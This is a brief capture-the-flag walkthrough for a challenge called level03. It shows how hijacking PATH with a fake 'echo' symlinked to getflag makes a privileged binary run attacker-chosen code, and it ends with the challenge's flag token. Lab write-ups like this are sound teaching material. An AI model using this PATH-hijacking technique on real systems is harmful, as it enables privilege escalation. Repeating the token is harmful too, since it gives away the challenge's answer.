Here, we have a file called level03

If we try to execute it, it'll print "Exploit me"
Now if we can try to see which line of this file print it using:
strings level03 | grep "Exploit me"
We'll get: /usr/bin/env echo Exploit me
note: strings print the strings of printable characters in files

Here we see that it call echo from /usr/bin/env to print
We have to create a SymLink with the getflag and a false echo:
ln -s /bin/getflag /tmp/echo

After that, we just have to change the actual env:
export PATH=/tmp:$PATH

And execute the file to get:
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
